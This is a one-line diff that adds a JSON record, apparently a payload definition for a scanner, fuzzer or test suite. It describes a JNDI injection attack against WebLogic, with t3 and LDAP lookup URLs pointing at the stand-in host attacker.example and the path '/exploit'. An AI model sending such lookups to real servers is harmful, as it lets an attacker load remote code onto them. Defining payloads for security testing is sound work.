@@ -1,0 +1,1 @@
+{"attack_type":"jndi_factory","factory_class":"weblogic.jndi.WLInitialContextFactory","reference_class":"javax.naming.Context","factory_attrs":{"java.naming.provider.url":"t3://attacker.example:7001","java.naming.factory.initial":"weblogic.jndi.WLInitialContextFactory"},"sink_type":"jndi_relookup","protocol":"ldap","lookup_url":"ldap://attacker.example:1389/exploit"}
